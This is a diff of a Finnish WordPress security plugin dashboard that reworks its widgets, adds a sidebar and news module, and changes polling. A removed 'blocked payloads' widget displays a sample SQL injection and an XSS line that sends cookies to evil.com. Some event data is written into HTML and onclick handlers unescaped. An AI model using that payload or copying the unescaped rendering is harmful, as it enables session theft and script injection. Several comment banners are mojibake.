-            <div class="flex flex-col gap-2" id="w-hardening-list">
-              <div class="text-xs text-slate-400">Ladataan tietoja...</div>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-6" data-cell="6">
-          <!-- 8. Blocked Payloads [NEW] -->
-          <div class="glass-card p-4 w-[500px]" id="w-payloads">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-2 ml-5">
-              <span class="material-symbols-outlined text-purple-600">bug_report</span>
-              <h3 class="font-bold text-slate-800 text-sm">Estetyt Kuormat (Reaaliaikainen)</h3>
-            </div>
-            <div class="font-mono text-[11px] text-pink-700 bg-pink-50 border border-pink-100 p-2 rounded truncate">
-              <span class="font-bold text-pink-900 mr-2">[SQLi]</span>
-              SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- 
-            </div>
-            <div class="font-mono text-[11px] text-purple-700 bg-purple-50 border border-purple-100 p-2 rounded mt-1 truncate">
-              <span class="font-bold text-purple-900 mr-2">[XSS]</span>
-              &lt;script&gt;fetch('http://evil.com/?c='+document.cookie)&lt;/script&gt;
-            </div>
-          </div>
-          <!-- Malware & File Integrity [NEW] -->
-          <div class="glass-card p-4 w-[500px]" id="w-malware">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center justify-between mb-3 mt-1 ml-5">
-              <div class="flex items-center gap-2">
-                <span class="material-symbols-outlined text-green-600">pest_control</span>
-                <h3 class="font-bold text-slate-800 text-sm">Tiedostojen Eheyden Skanneri</h3>
-              </div>
-              <span class="text-xs text-slate-400">Viimeisin skannaus: 2h sitten</span>
-            </div>
-            <div class="grid grid-cols-3 gap-3 mb-3">
-              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
-                <div class="text-xl font-black text-slate-700">0</div>
-                <div class="text-[10px] uppercase text-slate-500 font-bold">Saastunut</div>
-              </div>
-              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
-                <div class="text-xl font-black text-slate-700">1</div>
-                <div class="text-[10px] uppercase text-slate-500 font-bold">Muokattu</div>
-              </div>
-              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
-                <div class="text-xl font-black text-slate-700">2</div>
-                <div class="text-[10px] uppercase text-slate-500 font-bold">Karanteeni</div>
-              </div>
-            </div>
-            <div class="text-xs text-slate-600 bg-yellow-50 p-2 rounded border border-yellow-100">
-              <span class="font-bold text-yellow-800">Huomio:</span> Core file <span class="font-mono">wp-settings.php</span> on hiljattain muokattu.
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-7" data-cell="7">
-          <!-- 6. API Rate Limiter [NEW] -->
-          <div class="glass-card p-4 flex flex-col justify-between w-[240px]" id="w-rate">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-2 ml-5">
-              <span class="material-symbols-outlined text-indigo-600">speed</span>
-              <h3 class="font-bold text-slate-800 text-sm">WAF-nopeusrajoitus</h3>
-            </div>
-            <div class="text-center my-1">
-              <span class="text-2xl font-black text-slate-800">412</span>
-              <span class="text-xs text-slate-500 font-bold ml-1">pyyntöä/s</span>
-            </div>
-            <div class="w-full bg-slate-200 rounded-full h-2.5 overflow-hidden">
-              <div class="bg-indigo-600 h-2.5 rounded-full" style="width: 82%"></div>
-            </div>
-            <div class="flex justify-between text-[10px] text-slate-500 font-bold mt-1 uppercase">
-              <span>0</span>
-              <span class="text-pink-600">Raja: 500</span>
-            </div>
-            <div class="widget-settings-panel">
-              <h4 class="text-sm font-bold text-slate-700 mb-2">Asetukset</h4>
-              <div class="flex flex-col gap-2">
-                <label class="text-xs text-slate-600">Pyyntöraja (req/s)
-                  <input type="number" value="500" class="w-full mt-1 px-2 py-1 border border-slate-200 rounded text-xs">
-                </label>
-                <label class="text-xs text-slate-600">Estoaika (min)
-                  <input type="number" value="15" class="w-full mt-1 px-2 py-1 border border-slate-200 rounded text-xs">
-                </label>
-              </div>
-            </div>
-          </div>
-          <!-- Login Security [NEW] -->
-          <div class="glass-card p-4 w-[240px]" id="w-login-security">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
-              <span class="material-symbols-outlined text-blue-600">no_accounts</span>
-              <h3 class="font-bold text-slate-800 text-sm">Kirjautumisen Tietoturva</h3>
-            </div>
-            <div class="flex justify-between items-center mb-2">
-              <span class="text-xs font-bold text-slate-600">Epäonnistuneet Kirjautumiset (24h)</span>
-              <span class="bg-red-100 text-red-700 font-bold px-2 py-0.5 rounded-full text-xs">842</span>
-            </div>
-            <div class="flex justify-between items-center mb-2">
-              <span class="text-xs font-bold text-slate-600">Lukitut IP:t</span>
-              <span class="bg-slate-100 text-slate-700 font-bold px-2 py-0.5 rounded-full text-xs">15</span>
-            </div>
-            <div class="flex justify-between items-center">
-              <span class="text-xs font-bold text-slate-600">Aktiiviset Järjestelmänvalvojat</span>
-              <span class="bg-green-100 text-green-700 font-bold px-2 py-0.5 rounded-full text-xs">2</span>
-            </div>
-            <div class="widget-settings-panel w-full mt-4">
-              <div class="flex flex-col gap-4">
-                <!-- Yläosa: Kaavio ja Asetukset -->
-                <div class="bg-white rounded border border-slate-200 p-4 shadow-sm w-full">
-                  <div class="flex justify-between items-center mb-3">
-                    <div class="flex items-center gap-3">
-                      <h4 class="text-sm font-bold text-slate-700">Kirjautumisyritykset</h4>
-                      <select id="login-timeframe-filter" class="text-xs border border-slate-200 rounded px-2 py-1 text-slate-600 bg-slate-50" onchange="pmcSec.fetchLoginSubModalData()">
-                        <option value="24h">24 tuntia</option>
-                        <option value="7d">7 päivää</option>
-                        <option value="30d">30 päivää</option>
-                      </select>
-                    </div>
-                    <div class="flex gap-4">
-                      <label class="flex items-center gap-2 text-xs text-slate-600">
-                        Lukitse IP 
-                        <input type="number" id="quick-login-attempts" min="1" max="100" class="w-16 h-6 px-1 text-center border-slate-300 rounded text-pink-600 focus:ring-pink-500 bg-white" onchange="pmcSec.updateLoginAttempts(this.value)"> 
-                        epäonnistuneen yrityksen jälkeen
-                      </label>
-                    </div>
-                  </div>
-                  <div style="height: 250px; width: 100%;">
-                    <canvas id="loginChart"></canvas>
-                  </div>
-                </div>
-                <!-- Alaosa: Taulukko -->
-                <div class="bg-white rounded border border-slate-200 p-4 shadow-sm w-full flex flex-col">
-                  <div class="flex justify-between items-center mb-3">
-                    <h4 class="text-sm font-bold text-slate-700">Viimeisimmät Kirjautumistapahtumat</h4>
-                    <button class="text-xs bg-slate-100 hover:bg-slate-200 px-3 py-1.5 rounded font-bold text-slate-700" onclick="pmcSec.fetchLoginSubModalData()">Päivitä</button>
-                  </div>
-                  <div class="overflow-y-auto flex-grow" style="max-height: 280px;">
-                    <table class="w-full text-left text-xs" id="login-events-table">
-                      <thead class="sticky top-0 bg-slate-50 text-slate-500 shadow-[0_1px_2px_rgba(0,0,0,0.05)]">
-                        <tr>
-                          <th class="p-3 font-semibold border-b">Aika</th>
-                          <th class="p-3 font-semibold border-b">Tapahtuma</th>
-                          <th class="p-3 font-semibold border-b">IP-osoite</th>
-                          <th class="p-3 font-semibold border-b">Maa</th>
-                          <th class="p-3 font-semibold border-b text-right">Toiminto</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        <tr><td colspan="5" class="text-center p-4 text-slate-400">Ladataan tietoja...</td></tr>
-                      </tbody>
-                    </table>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-8" data-cell="8">
-          <!-- 7. Node Health [NEW] -->
-          <div class="glass-card p-4 w-[280px]" id="w-node-health">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
-              <span class="material-symbols-outlined text-green-600">hub</span>
-              <h3 class="font-bold text-slate-800 text-sm">Solmun Tila</h3>
-            </div>
-            <div class="flex flex-col gap-3">
-              <div>
-                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
-                  <span>Helsinki-Edge-1</span>
-                  <span class="text-green-600">14ms</span>
-                </div>
-                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-green-500 h-1.5 rounded-full" style="width:14%"></div></div>
-              </div>
-              <div>
-                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
-                  <span>Vantaa-DC-01</span>
-                  <span class="text-yellow-600">48ms</span>
-                </div>
-                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-yellow-500 h-1.5 rounded-full" style="width:48%"></div></div>
-              </div>
-              <div>
-                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
-                  <span>Helsinki-Cluster-B</span>
-                  <span class="text-red-600">210ms (Kuormituksen alaisena)</span>
-                </div>
-                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-red-500 h-1.5 rounded-full" style="width:95%"></div></div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-      </div><!-- /ps-widgets -->
     </div><!-- /ps-map-area -->
   </div><!-- /ps-main -->
+
+  <!-- ps-right-sidebar: Tracking Widgets -->
+  <aside id="ps-right-sidebar" style="width: 320px; min-width: 320px; height: 100%; max-height: 100%; background: #f8fafc; border-left: 1px solid #e2e8f0; display: flex; flex-direction: column; overflow-y: auto; padding: 16px; gap: 16px; z-index: 100; box-sizing: border-box;">
+    <h3 style="font-size: 14px; font-weight: 700; color: #1e293b; margin: 0 0 4px 0; text-transform: uppercase; letter-spacing: 0.05em;">Seuranta (Widgets)</h3>
+    
+    <div class="glass-card widget-resources" id="w-resources" style="width: 100%; border: 1px solid #e2e8f0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); padding: 14px;">
+      <h4 style="font-size: 11px; font-weight: 600; color: #64748b; text-transform: uppercase; margin-bottom: 10px; display: flex; align-items: center; gap: 6px;">
+        <span class="material-symbols-outlined" style="font-size: 16px; color: #b80048;">memory</span>
+        Järjestelmäresurssit
+      </h4>
+      <div class="res-row" style="margin-bottom: 8px;">
+        <div class="res-row-head" style="display: flex; justify-content: space-between; font-size: 12px; font-weight: 500; margin-bottom: 4px;"><span>Suorittimen Käyttö</span><span>0%</span></div>
+        <div class="res-bar" style="height: 5px; background: #e2e8f0; border-radius: 99px;"><div class="res-bar-fill" style="width:0%; height: 100%; background: #b80048; border-radius: 99px;"></div></div>
+      </div>
+      <div class="res-row">
+        <div class="res-row-head" style="display: flex; justify-content: space-between; font-size: 12px; font-weight: 500; margin-bottom: 4px;"><span>Muisti</span><span>-</span></div>
+        <div class="res-bar" style="height: 5px; background: #e2e8f0; border-radius: 99px;"><div class="res-bar-fill" style="width:0%; height: 100%; background: #b80048; border-radius: 99px;"></div></div>
+      </div>
+    </div>
+
+    <div class="glass-card widget-traffic" id="w-traffic" style="width: 100%; border: 1px solid #e2e8f0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); padding: 14px;">
+      <h4 style="font-size: 11px; font-weight: 600; color: #64748b; text-transform: uppercase; margin-bottom: 10px; display: flex; align-items: center; gap: 6px;">
+        <span class="material-symbols-outlined" style="font-size: 16px; color: #b80048;">monitoring</span>
+        Liikenne
+      </h4>
+      <div class="traffic-val" style="font-size: 24px; font-weight: 700;">0<span style="font-size: 12px; color: #64748b; font-weight: 500;"> B/s</span></div>
+      <div class="traffic-label" style="font-size: 10px; color: #94a3b8; margin-bottom: 8px;">Saapuva</div>
+      <div class="traffic-bars" style="display: flex; align-items: flex-end; gap: 3px; height: 32px;">
+        <div class="traffic-bar" style="flex:1; background:#b80048; opacity:0.25; height:40%"></div>
+        <div class="traffic-bar" style="flex:1; background:#b80048; opacity:0.25; height:60%"></div>
+        <div class="traffic-bar active" style="flex:1; background:#b80048; opacity:1; height:100%"></div>
+        <div class="traffic-bar" style="flex:1; background:#b80048; opacity:0.25; height:55%"></div>
+        <div class="traffic-bar" style="flex:1; background:#b80048; opacity:0.25; height:30%"></div>
+      </div>
+    </div>
+
+    <div class="glass-card widget-log" id="w-log" style="width: 100%; border: 1px solid #e2e8f0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); display: flex; flex-direction: column;">
+      <div class="log-header" style="padding: 12px 14px; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center;">
+        <h3 style="font-size: 13px; font-weight: 700; margin: 0;">Reaaliaikainen Tapahtumaloki</h3>
+      </div>
+      <div class="log-table-wrap" style="max-height: 250px; overflow-y: auto;">
+        <table class="log-table" style="width: 100%; border-collapse: collapse; font-size: 11px;">
+          <thead>
+            <tr>
+              <th style="padding: 6px 10px; text-align: left; background: #f8fafc; color: #64748b;">Aika</th>
+              <th style="padding: 6px 10px; text-align: left; background: #f8fafc; color: #64748b;">Lähde</th>
+              <th style="padding: 6px 10px; text-align: left; background: #f8fafc; color: #64748b;">Kohde</th>
+              <th style="padding: 6px 10px; text-align: left; background: #f8fafc; color: #64748b;">Hyökkäys</th>
+              <th style="padding: 6px 10px; text-align: right; background: #f8fafc; color: #64748b;">Status</th>
+            </tr>
+          </thead>
+          <tbody id="event-log-body">
+            <tr><td colspan="5" style="padding: 10px; text-align: center; color: #94a3b8;">Odotetaan tapahtumia...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Uutiset ja Tietoturvatiedotteet Widget -->
+    <div class="glass-card widget-news" id="w-news" style="width: 100%; border: 1px solid #e2e8f0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); display: flex; flex-direction: column; flex: 1; min-height: 250px;">
+      <div class="news-header" style="padding: 12px 14px; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; background: #fff; border-radius: 12px 12px 0 0;">
+        <h4 style="font-size: 12px; font-weight: 700; color: #1e293b; margin: 0; display: flex; align-items: center; gap: 6px;">
+          <span class="material-symbols-outlined" style="font-size: 16px; color: #b80048;">newspaper</span>
+          WP Tietoturvauutiset
+        </h4>
+        <div style="display:flex; gap:8px;">
+          <button id="refresh-news-btn" style="background:none; border:none; color:#64748b; cursor:pointer; padding:2px; display:flex;" title="Päivitä">
+            <span class="material-symbols-outlined" style="font-size:16px;">refresh</span>
+          </button>
+          <button onclick="psOpenModule('news')" style="background:none; border:none; color:#b80048; cursor:pointer; font-size:10px; font-weight:700; text-transform:uppercase; display:flex; align-items:center; gap:2px; padding:0;">
+            Lue lisää <span class="material-symbols-outlined" style="font-size:14px;">open_in_new</span>
+          </button>
+        </div>
+      </div>
+      <div class="news-content-wrap" style="flex: 1; overflow-y: auto; padding: 12px; background: #fafaf9; border-radius: 0 0 12px 12px;">
+        <div id="news-feed-container" style="display: flex; flex-direction: column; gap: 10px;">
+          <div style="text-align:center; padding:20px; color:#94a3b8; font-size:11px;">Haetaan tuoreimpia uutisia...</div>
+        </div>
+      </div>
+    </div>
+
+  </aside>
 </div><!-- /ps-shell -->
 
 <!-- ä.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ä
@@ -1531,6 +1395,8 @@ if ( ! defined( 'ABSPATH' ) ) {
 	require_once $modules_dir . 'view-audit-log.php';
 	require_once $modules_dir . 'view-notifications.php';
 	require_once $modules_dir . 'view-modules-overview.php';
+	require_once $modules_dir . 'view-integrations.php';
+	require_once $modules_dir . 'view-news.php';
 	?>
 </div>
 
@@ -1665,7 +1531,8 @@ function psOpenModule(moduleId) {
 	// Determine initial module from URL
 	$current_page = isset($_GET['page']) ? sanitize_text_field($_GET['page']) : 'pecodex-security';
 	$initial_module = 'none';
-	if ($current_page === 'pecodex-security-firewall') $initial_module = 'firewall';
+	if ($current_page === 'pecodex-security-news') $initial_module = 'news';
+	elseif ($current_page === 'pecodex-security-firewall') $initial_module = 'firewall';
 	elseif ($current_page === 'pecodex-security-hardening') $initial_module = 'hardening';
 	elseif ($current_page === 'pecodex-security-scanner') $initial_module = 'scanner';
 	elseif ($current_page === 'pecodex-security-advanced') $initial_module = 'advanced';
@@ -1747,7 +1614,9 @@ const locations = {
 /* ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?
    MAP INIT  (light tiles)
 ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"? */
-const map = L.map('security-map', {
+let map = null;
+if (document.getElementById('security-map')) {
+map = L.map('security-map', {
   center: locations.hub,
   zoom: 4,
   zoomControl: false,
@@ -1778,9 +1647,9 @@ function makeHubIcon() {
   return L.divIcon({
     className: '',
     html: `<div style="position:relative;width:22px;height:22px;">
-      <div style="position:absolute;inset:0;border-radius:50%;background:#1d4ed8;border:3px solid #fff;box-shadow:0 0 0 2px #1d4ed8,0 4px 12px rgba(29,78,216,0.5);"></div>
-      <div style="position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(29,78,216,0.35);animation:hub-pulse 2s ease-out infinite;"></div>
-      <div style="position:absolute;inset:-14px;border-radius:50%;border:1.5px solid rgba(29,78,216,0.15);animation:hub-pulse 2s ease-out 0.7s infinite;"></div>
+      <div style="position:absolute;inset:0;border-radius:50%;background:#be123c;border:3px solid #fff;box-shadow:0 0 0 2px #be123c,0 4px 12px rgba(190,18,60,0.5);"></div>
+      <div style="position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(190,18,60,0.35);animation:hub-pulse 2s ease-out infinite;"></div>
+      <div style="position:absolute;inset:-14px;border-radius:50%;border:1.5px solid rgba(190,18,60,0.15);animation:hub-pulse 2s ease-out 0.7s infinite;"></div>
     </div>`,
     iconSize: [22, 22],
     iconAnchor: [11, 11],
@@ -1935,11 +1804,13 @@ map.on('zoomend', () => {
 /* ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?
    LIVE EVENTS POLLING
 ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"? */
+let isFetchingLiveEvents = false;
 async function fetchLiveEvents() {
+  if (isFetchingLiveEvents) return;
+  isFetchingLiveEvents = true;
   try {
     const formData = new FormData();
     formData.append('action', 'pmc_security_live_map_data');
-    // Add nonce for authenticated AJAX
     if (typeof pmcSecurityConfig !== 'undefined' && pmcSecurityConfig.nonce) {
       formData.append('nonce', pmcSecurityConfig.nonce);
     }
@@ -1948,7 +1819,6 @@ async function fetchLiveEvents() {
       body: formData
     });
     const res = await response.json();
-    // Handler now returns { events: [...] } inside res.data
     const events = (res.success && res.data && Array.isArray(res.data.events))
       ? res.data.events
       : (res.success && Array.isArray(res.data) ? res.data : []);
@@ -1956,11 +1826,12 @@ async function fetchLiveEvents() {
     updateEventLogTable(activeMapEvents);
     updateMapMarkers(activeMapEvents);
     drawAttackLines();
-    // Update live badge counter
     const badge = document.getElementById('live-event-count');
     if (badge) badge.textContent = activeMapEvents.length;
   } catch (err) {
-    console.error('Live-tapahtumien nouto ep\u00e4onnistui:', err);
+    console.error('Live-tapahtumien nouto epäonnistui:', err);
+  } finally {
+    isFetchingLiveEvents = false;
   }
 }
 
@@ -1977,7 +1848,7 @@ function updateEventLogTable(events) {
     html += `
       <tr>
         <td class="td-time">${e.timestamp}</td>
-        <td>${e.country} ä?" ${e.city}</td>
+        <td>${e.country} — ${e.city}</td>
         <td>${e.target}</td>
         <td>${e.attack}</td>
         <td style="text-align:right"><span class="badge-status ${badgeCls}">${e.status}</span></td>
@@ -1987,8 +1858,7 @@ function updateEventLogTable(events) {
   tbody.innerHTML = html;
 }
 
-// Poll every 15 seconds
-setInterval(fetchLiveEvents, 15000);
+// Initial fetch
 fetchLiveEvents();
 
 /* ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?
@@ -2298,6 +2168,8 @@ if (typeof Sortable !== 'undefined') {
    Now handled by fetchLiveEvents()
 ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"? */
 
+} // end if security-map
+
 /* ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?
    PECODEX SECURITY AJAX INTEGRATION
 ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"? */
@@ -2328,19 +2200,56 @@ const HEADER_DEFS = {
 };
 
 window.pmcSec = {
+	pollTimerMaster: null,
+	pollTimerLive: null,
+	isFetchingMaster: false,
+
 	init() {
 		if (typeof pmcSecurityConfig === 'undefined') return;
 		this.fetchMasterData();
 		this.fetchAuditLog();
 		this.fetchLockoutLog();
-		setInterval(() => this.fetchMasterData(), 10000);
+		this.startAdaptivePolling();
 	},
+
+	startAdaptivePolling() {
+		const setupIntervals = () => {
+			if (this.pollTimerMaster) clearInterval(this.pollTimerMaster);
+			if (this.pollTimerLive) clearInterval(this.pollTimerLive);
+
+			const isHidden = document.hidden;
+			// Short polling when active (8s & 10s), Long polling when backgrounded (60s)
+			const masterInterval = isHidden ? 60000 : 8000;
+			const liveInterval = isHidden ? 60000 : 10000;
+
+			this.pollTimerMaster = setInterval(() => this.fetchMasterData(), masterInterval);
+			this.pollTimerLive = setInterval(() => {
+				if (typeof fetchLiveEvents === 'function') fetchLiveEvents();
+			}, liveInterval);
+		};
+
+		setupIntervals();
+
+		// Page Visibility API - instant catchup on tab focus
+		document.addEventListener('visibilitychange', () => {
+			setupIntervals();
+			if (!document.hidden) {
+				this.fetchMasterData();
+				if (typeof fetchLiveEvents === 'function') fetchLiveEvents();
+			}
+		});
+	},
+
 	async post(action, data = {}) {
 		const formData = new FormData();
 		formData.append('action', action);
 		formData.append('nonce', pmcSecurityConfig.nonce);
 		for (const [key, val] of Object.entries(data)) {
-			formData.append(key, val);
+			if (Array.isArray(val)) {
+				val.forEach(item => formData.append(`${key}[]`, item));
+			} else {
+				formData.append(key, val);
+			}
 		}
 		const res = await fetch(pmcSecurityConfig.ajaxUrl, {
 			method: 'POST',
@@ -2349,6 +2258,8 @@ window.pmcSec = {
 		return await res.json();
 	},
 	async fetchMasterData() {
+		if (this.isFetchingMaster) return;
+		this.isFetchingMaster = true;
 		try {
 			const res = await this.post('pmc_security_data');
 			if (res.success) {
@@ -2357,6 +2268,8 @@ window.pmcSec = {
 			}
 		} catch (e) {
 			console.error("Pecodex Security: Päätietojen nouto epäonnistui", e);
+		} finally {
+			this.isFetchingMaster = false;
 		}
 	},
 	async fetchAuditLog(page = 1) {
@@ -3317,13 +3230,13 @@ const WIDGET_MODALS = {
             [
               { label: 'Aika',   key: 'timestamp' },
               { label: 'IP',     key: 'ip' },
-              { label: 'Maa',   render: r => \`\${r.country||'?'} — \${r.city||'?'}\` },
+              { label: 'Maa',   render: r => `${r.country||'?'} — ${r.city||'?'}` },
               { label: 'Hyökkäys', render: r => r.attack||r.type||'—' },
               { label: 'Status', render: r => WidgetModal.badge(r.status||'—', r.statusClass==='critical'?'critical':r.statusClass==='success'?'success':'warning') },
-              { label: '', render: r => \`<div style="display:flex;gap:6px">
-                  <button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('\${r.ip}')">Estä</button>
-                  <button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px" onclick="openModal(\${JSON.stringify(r).replace(/"/g,'&quot;')})">Tutki</button>
-                </div>\` },
+              { label: '', render: r => `<div style="display:flex;gap:6px">
+                  <button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('${r.ip}')">Estä</button>
+                  <button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px" onclick="openModal(${JSON.stringify(r).replace(/"/g,'&quot;')})">Tutki</button>
+                </div>` },
             ],
             events, { selectable: true }
           );
@@ -3344,9 +3257,9 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Estä valitut IP:t', style:'danger',   onclick: \`() => { const ips=[...document.querySelectorAll('#wm-w-log .wm-row-cb:checked')].map(c=>c.value); if(ips.length) pmcSec.post('pmc_security_bulk_ban',{ips}).then(r=>r.success&&alert('Estetty: '+ips.length+' IP-osoitetta')); }\` },
-      { label:'Vie CSV', style:'secondary', onclick: \`() => pmcSec.post('pmc_export_log_csv',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))\` },
-      { label:'Tyhjennä loki', style:'secondary', onclick: \`() => confirm('Tyhjennä tapahtumaloki?')&&pmcSec.post('pmc_clear_event_log',{}).then(r=>alert(r.success?'Loki tyhjennetty':'Virhe'))\` },
+      { label:'Estä valitut IP:t', style:'danger',   onclick: `() => { const ips=[...document.querySelectorAll('#wm-w-log .wm-row-cb:checked')].map(c=>c.value); if(ips.length) pmcSec.post('pmc_security_bulk_ban',{ips}).then(r=>r.success&&alert('Estetty: '+ips.length+' IP-osoitetta')); }` },
+      { label:'Vie CSV', style:'secondary', onclick: `() => pmcSec.post('pmc_export_log_csv',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))` },
+      { label:'Tyhjennä loki', style:'secondary', onclick: `() => confirm('Tyhjennä tapahtumaloki?')&&pmcSec.post('pmc_clear_event_log',{}).then(r=>alert(r.success?'Loki tyhjennetty':'Virhe'))` },
     ],
   },
 
@@ -3363,11 +3276,11 @@ const WIDGET_MODALS = {
             [
               { label:'#', render: (_,i) => i+1 },
               { label:'IP', key:'ip' },
-              { label:'Maa', render:r=>\`\${r.country||'?'}\` },
+              { label:'Maa', render:r=>`${r.country||'?'}` },
               { label:'Kaupunki', render:r=>r.city||'—' },
               { label:'Uhkataso', render:r=>WidgetModal.badge(r.threat_score||'?', (r.threat_score||0)>70?'critical':(r.threat_score||0)>40?'warning':'success') },
               { label:'Tyyppi', render:r=>r.attack||r.type||'—' },
-              { label:'', render:r=>\`<button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('\${r.ip}')">Estä IP</button>\` },
+              { label:'', render:r=>`<button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('${r.ip}')">Estä IP</button>` },
             ],
             rows, { selectable:true }
           );
@@ -3384,7 +3297,7 @@ const WIDGET_MODALS = {
               { label:'IP/Alue', key:'ip' },
               { label:'Syy', key:'reason' },
               { label:'Estetty', key:'date' },
-              { label:'', render:r=>\`<button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px" onclick="pmcSec.post('pmc_security_unban_ip',{ip:'\${r.ip}'}).then(()=>location.reload())">Poista esto</button>\` },
+              { label:'', render:r=>`<button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px" onclick="pmcSec.post('pmc_security_unban_ip',{ip:'${r.ip}'}).then(()=>location.reload())">Poista esto</button>` },
             ],
             rows
           );
@@ -3403,9 +3316,9 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Estä valitut maat', style:'danger',   onclick:\`() => alert('GeoIP bulk-esto: valitse maat listasta')\` },
-      { label:'Estä valitut IP:t', style:'warning',  onclick:\`() => { const ips=[...document.querySelectorAll('#wm-w-heatmap .wm-row-cb:checked')].map(c=>c.value); if(ips.length) pmcSec.post('pmc_security_bulk_ban',{ips}).then(r=>alert(r.success?'Estetty '+ips.length+' IP:tä':'Virhe')); }\` },
-      { label:'Lataa raportti',   style:'secondary', onclick:\`() => pmcSec.post('pmc_export_attackers',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))\` },
+      { label:'Estä valitut maat', style:'danger',   onclick:`() => alert('GeoIP bulk-esto: valitse maat listasta')` },
